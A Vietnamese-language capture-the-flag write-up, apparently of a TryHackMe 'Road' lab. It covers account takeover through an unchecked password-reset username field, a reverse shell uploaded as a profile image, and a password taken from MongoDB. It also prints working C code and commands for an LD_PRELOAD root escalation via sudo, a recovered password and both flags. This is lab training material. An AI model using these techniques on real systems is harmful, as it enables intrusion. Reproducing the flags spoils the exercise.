<img width="698" height="595" alt="image" src="https://github.com/user-attachments/assets/79015724-62f1-4d89-b48b-295bddaaf8c5" /># road.thm

sudo nano /etc/hosts

10.201.21.247   sky.thm

recon

<img width="1184" height="385" alt="image" src="https://github.com/user-attachments/assets/05d6a9e2-0614-4f5e-87b8-168293d9e894" />

enumerating

<img width="833" height="458" alt="image" src="https://github.com/user-attachments/assets/7c676d53-9c8c-4240-905b-7e2ca574b667" />

trang đăng nhập có thể đăng ký

<img width="1273" height="765" alt="image" src="https://github.com/user-attachments/assets/ea82d017-fe88-48bf-ad3c-c4bd3865c082" />

tôi thử đăng ký 

<img width="1284" height="777" alt="image" src="https://github.com/user-attachments/assets/b85f58c0-9ad8-48f9-9a9b-0889ab0ed44b" />

<img width="1293" height="793" alt="image" src="https://github.com/user-attachments/assets/d8e86e0c-e3ce-4b68-b50e-4195773440ca" />

ở liên kết ResetUser cho phép thay đổi mật khẩu 

<img width="1268" height="763" alt="image" src="https://github.com/user-attachments/assets/9c55a22f-9891-4b4d-8b88-3232959525e1" />

tôi thử dùng burp suite chặn lại và sửa uname , thật lạ là đều trả về thành công bất kể tôi sửa thành uname gì nhưng nếu tôi không biết được tên của người dùng thì đều này sẽ vô nghĩa

<img width="1268" height="763" alt="image" src="https://github.com/user-attachments/assets/780b8fec-23bf-4d3f-ab7b-5d42bf61680d" />

tôi bắt đầu tìm kiếm tên người dùng có trong web 

ở trang profile đang có thông tin tôi cần tìm 

trang này chứa 1 loạt thông tin hồ sơ nhưng không có quyền chỉnh sửa và có nút tải hình hồ sơ nó tiết lộ cho tôi 1 email admin@sky.thm

<img width="1280" height="759" alt="image" src="https://github.com/user-attachments/assets/0820ae6a-9352-4a1d-b3fc-5ac5d2e0772c" />

tôi sẽ quay lại trang resetUser mở burp suite chặn yêu cầu POST sửa uname 

<img width="961" height="793" alt="image" src="https://github.com/user-attachments/assets/0ca7fffa-22ae-4c78-b313-12e96edfcae3" />

đổi thành công sau đó tôi đăng xuất ra đăng nhập với uname admin@sky.thm

<img width="1286" height="771" alt="image" src="https://github.com/user-attachments/assets/fbc0c48a-baf5-4975-8cdb-b671c202ff33" />

tiếp theo tôi vào lại trang profile tôi thử tải reverse shell lên Select Profile Image thành công 

nhưng tôi thật sự không biết file reverse tôi tải lên nó nằm ở đâu 

kiểm tra mã nguồn thì thấy đường dẫn /v2/profileimages/

<img width="661" height="708" alt="image" src="https://github.com/user-attachments/assets/398868c5-b469-4e2b-b217-9b440fbf2ff9" />

nhưng có thông báo là thư mục bị vô hiệu hóa 

<img width="1267" height="754" alt="image" src="https://github.com/user-attachments/assets/86a60d25-28f2-4693-94cc-f9a69c5815d9" />

nhưng chỉ cần thêm tên tệp tôi tải lên và lắng nghe trên port 1234 

và tôi đã có shell 

<img width="1000" height="507" alt="image" src="https://github.com/user-attachments/assets/60d968a0-0597-4e06-b253-c9de4a111435" />

cờ người dùng ở đường dẫn /home/webdeveloper

63191e4ece37523c9fe6bb62a5e64d45

sau đó tôi tìm cách nâng quyền 

thử lệnh sudo -l và nhập password tôi đã đổi ở web kết quả không thành công 

<img width="953" height="648" alt="image" src="https://github.com/user-attachments/assets/16338781-1b43-460c-a7a3-21808e28dd25" />

<img width="578" height="467" alt="image" src="https://github.com/user-attachments/assets/05b7cd40-62d1-481b-a49b-f2ab64de8597" />

có tệp tôi là mongo nên tôi thử kết nối đến databases mongo

<img width="698" height="595" alt="image" src="https://github.com/user-attachments/assets/2f9cd6b9-9829-4b5a-b785-89749d1c7fb9" />

<img width="905" height="473" alt="image" src="https://github.com/user-attachments/assets/efe187af-a1f3-45a9-a805-eed21f5922ad" />

vậy là tôi đã có password của người dùng là BahamasChapp123!@#

sau đó tôi đăng nhập bằng ssh để có shell ổn định hơn 

<img width="1152" height="571" alt="image" src="https://github.com/user-attachments/assets/8c3e051b-26b9-478c-b675-8ccab69d3342" />

cd /tmp

nano shell.c

#include <stdio.h>

#include <sys/types.h>

#include <stdlib.h>

void _init() {

unsetenv("LD_PRELOAD");

setgid(0);

setuid(0);

system("/bin/bash");

}

<img width="1272" height="449" alt="image" src="https://github.com/user-attachments/assets/c1c98424-783b-45bf-9d73-79b4628bc6a9" />

gcc shell.c -o exploit -fPIC -shared -nostartfiles -w

sudo LD_PRELOAD=/tmp/exploit /usr/bin/sky_backup_utility

<img width="845" height="228" alt="image" src="https://github.com/user-attachments/assets/23441887-e6e5-47cd-8cba-90509822f6a5" />

cờ root : 3a62d897c40a815ecbe267df2f533ac6
